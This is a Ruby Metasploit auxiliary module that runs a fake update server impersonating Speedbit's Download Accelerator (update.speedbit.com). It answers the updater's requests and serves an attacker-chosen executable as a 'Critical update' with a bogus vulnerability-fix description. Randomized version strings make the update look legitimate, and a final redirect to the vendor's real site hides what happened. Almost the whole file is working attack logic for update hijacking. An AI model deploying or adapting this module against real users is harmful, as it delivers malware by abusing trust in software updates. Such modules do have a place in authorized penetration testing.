require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Download Accelerator Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Download Accelerator updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)
		
		@base = {	
			'vh' => ['update.speedbit.com'],
	    		'request' => [{
				'req' => '^/cgi-bin/Update.dll', #regex friendly
				'type' => 'string', #file|string|agent
				'method' => '', #any
				'bin'    => '',
				'string' => 'OK',
				'parse' => '',
				'file' => ''
			},
			{
				'req' => '^/cgi-bin/update.dll', #regex friendly
				'type' => 'file', #file|string|agent
				'method' => '', #any
				'bin'    => '',		    
				'string' => '',
				'parse' => 1,
				'file' => 'dap_update.dll'
			},
			{
				'req' => '.exe', #regex friendly
				'type' => 'agent', #file|string|agent
				'bin'    => 1,
				'method' => '', #any
				'string' => '',
				'parse' => '',
				'file' => ''
			},
			{
				'req' => 'updateok', #regex friendly
				'type' => 'install', #file|string|agent|install
				'bin'    => 0,
				'method' => '', #any
				'string' => '<html><script>window.location="http://www.speedbit.com/finishupdate.asp?R=0"</script></html>',
				'parse' => '',
				'file' => ''
			}
			],
    			'options' => {
				'title'  => { 
					'val' => 'Critical update',
					'desc' => 'Title name display in the update'
				},
				'description' => { 
					'val' => 'This critical update fix internal vulnerability',
					'desc' => 'Description display in the update'
				},
				'name'  => {
					'val' => "dapupdate#{RndAlpha(RndNum(1))}",
					'hidden' => 1,
					'dynamic' =>1,
				},
				'version'  => { 
					'val' => "9#{RndNum(3)}.#{RndNum(4)}.#{RndNum(1)}.#{RndNum(1)}",
					'hidden' => 1,
					'dynamic' =>1,
				},
				'rnd1'  => { 
					'val' => "#{RndNum(8)}",
					'hidden' => 1,
					'dynamic' =>1,
				},
				'endsite' => { 
					'val' => 'update.speedbit.com/updateok.html',
					'desc' => 'Website display when finish update'
				},
				'failsite' => { 
					'val' => 'www.speedbit.com/finishupdate.asp?noupdate=&R=0',
					'desc' => 'Website display when did\'t finish update'
				} 
			}
		}
	end
end
